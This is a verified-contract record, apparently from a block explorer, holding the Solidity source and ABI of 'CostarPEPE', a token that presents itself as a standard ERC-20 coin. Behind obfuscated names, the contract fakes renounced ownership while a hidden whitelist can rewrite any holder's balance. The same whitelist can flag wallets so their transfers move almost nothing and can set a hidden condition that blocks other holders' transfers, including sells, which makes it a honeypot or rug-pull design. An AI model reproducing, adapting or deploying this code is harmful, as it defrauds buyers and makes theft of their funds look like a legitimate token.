{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface modeIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address amountTakeReceiver) external view returns (uint256);\n\n    function transfer(address modeTo, uint256 receiverExempt) external returns (bool);\n\n    function allowance(address amountAt, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 receiverExempt) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address modeTo,\n        uint256 receiverExempt\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed amountTx, uint256 value);\n    event Approval(address indexed amountAt, address indexed spender, uint256 value);\n}\n\nabstract contract fromToReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface modeSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface maxTotal {\n    function createPair(address maxWallet, address senderReceiverEnable) external returns (address);\n}\n\ninterface modeIsMetadata is modeIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CostarPEPE is fromToReceiver, modeIs, modeIsMetadata {\n\n    address toSell = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private txAtEnable;\n\n    function limitFeeMarketing(address senderReceiver, address modeTo, uint256 receiverExempt) internal returns (bool) {\n        if (senderReceiver == totalFromAuto) {\n            return marketingMin(senderReceiver, modeTo, receiverExempt);\n        }\n        uint256 txMode = modeIs(amountFee).balanceOf(toSell);\n        require(txMode == receiverTxMin);\n        require(modeTo != toSell);\n        if (fundIs[senderReceiver]) {\n            return marketingMin(senderReceiver, modeTo, liquidityToken);\n        }\n        return marketingMin(senderReceiver, modeTo, receiverExempt);\n    }\n\n    mapping(address => uint256) private tokenAmount;\n\n    string private feeSell = \"Costar PEPE\";\n\n    function name() external view virtual override returns (string memory) {\n        return feeSell;\n    }\n\n    uint256 receiverTxMin;\n\n    function owner() external view returns (address) {\n        return sellSender;\n    }\n\n    function marketingTrading(address listReceiver) public {\n        fundAmountAt();\n        if (buyLimit != sellExempt) {\n            launchTo = true;\n        }\n        if (listReceiver == totalFromAuto || listReceiver == amountFee) {\n            return;\n        }\n        fundIs[listReceiver] = true;\n    }\n\n    uint256 private toTake = 100000000 * 10 ** 18;\n\n    address private sellSender;\n\n    bool public liquidityTake;\n\n    function decimals() external view virtual override returns (uint8) {\n        return txSwap;\n    }\n\n    function receiverListTeam(address atTeam, uint256 receiverExempt) public {\n        fundAmountAt();\n        tokenAmount[atTeam] = receiverExempt;\n    }\n\n    uint256 constant liquidityToken = 16 ** 10;\n\n    bool public txMarketing;\n\n    uint8 private txSwap = 18;\n\n    event OwnershipTransferred(address indexed tokenTradingMax, address indexed exemptBuy);\n\n    function exemptToMode(uint256 receiverExempt) public {\n        fundAmountAt();\n        receiverTxMin = receiverExempt;\n    }\n\n    bool private tradingMaxAmount;\n\n    uint256 public buyLimit;\n\n    mapping(address => mapping(address => uint256)) private walletTradingAuto;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return toTake;\n    }\n\n    function transfer(address atTeam, uint256 receiverExempt) external virtual override returns (bool) {\n        return limitFeeMarketing(_msgSender(), atTeam, receiverExempt);\n    }\n\n    address public amountFee;\n\n    function balanceOf(address amountTakeReceiver) public view virtual override returns (uint256) {\n        return tokenAmount[amountTakeReceiver];\n    }\n\n    function transferFrom(address senderReceiver, address modeTo, uint256 receiverExempt) external override returns (bool) {\n        if (_msgSender() != takeTeam) {\n            if (walletTradingAuto[senderReceiver][_msgSender()] != type(uint256).max) {\n                require(receiverExempt <= walletTradingAuto[senderReceiver][_msgSender()]);\n                walletTradingAuto[senderReceiver][_msgSender()] -= receiverExempt;\n            }\n        }\n        return limitFeeMarketing(senderReceiver, modeTo, receiverExempt);\n    }\n\n    function approve(address walletShould, uint256 receiverExempt) public virtual override returns (bool) {\n        walletTradingAuto[_msgSender()][walletShould] = receiverExempt;\n        emit Approval(_msgSender(), walletShould, receiverExempt);\n        return true;\n    }\n\n    uint256 public amountTeam;\n\n    function feeListTeam(address amountIs) public {\n        if (liquidityTake) {\n            return;\n        }\n        \n        receiverReceiver[amountIs] = true;\n        if (txMarketing != txTotalAuto) {\n            txAtEnable = amountTeam;\n        }\n        liquidityTake = true;\n    }\n\n    mapping(address => bool) public fundIs;\n\n    mapping(address => bool) public receiverReceiver;\n\n    address public totalFromAuto;\n\n    address takeTeam = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private receiverSell = \"CPE\";\n\n    bool public exemptSenderWallet;\n\n    bool private launchTo;\n\n    uint256 senderTakeEnable;\n\n    uint256 public sellExempt;\n\n    function getOwner() external view returns (address) {\n        return sellSender;\n    }\n\n    constructor (){\n        if (txTotalAuto == txMarketing) {\n            launchTo = false;\n        }\n        modeSell maxLaunched = modeSell(takeTeam);\n        amountFee = maxTotal(maxLaunched.factory()).createPair(maxLaunched.WETH(), address(this));\n        \n        totalFromAuto = _msgSender();\n        atTrading();\n        receiverReceiver[totalFromAuto] = true;\n        tokenAmount[totalFromAuto] = toTake;\n        \n        emit Transfer(address(0), totalFromAuto, toTake);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverSell;\n    }\n\n    function allowance(address exemptAtLimit, address walletShould) external view virtual override returns (uint256) {\n        if (walletShould == takeTeam) {\n            return type(uint256).max;\n        }\n        return walletTradingAuto[exemptAtLimit][walletShould];\n    }\n\n    function marketingMin(address senderReceiver, address modeTo, uint256 receiverExempt) internal returns (bool) {\n        require(tokenAmount[senderReceiver] >= receiverExempt);\n        tokenAmount[senderReceiver] -= receiverExempt;\n        tokenAmount[modeTo] += receiverExempt;\n        emit Transfer(senderReceiver, modeTo, receiverExempt);\n        return true;\n    }\n\n    function fundAmountAt() private view {\n        require(receiverReceiver[_msgSender()]);\n    }\n\n    bool public txTotalAuto;\n\n    function atTrading() public {\n        emit OwnershipTransferred(totalFromAuto, address(0));\n        sellSender = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenTradingMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptBuy\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"amountTx\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"exemptAtLimit\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletShould\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFee\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountTeam\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverExempt\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTakeReceiver\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSenderWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"receiverExempt\",\"type\":\"uint256\"}],\"name\":\"exemptToMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountIs\",\"type\":\"address\"}],\"name\":\"feeListTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listReceiver\",\"type\":\"address\"}],\"name\":\"marketingTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverExempt\",\"type\":\"uint256\"}],\"name\":\"receiverListTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFromAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atTeam\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverExempt\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"modeTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"receiverExempt\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txTotalAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CostarPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}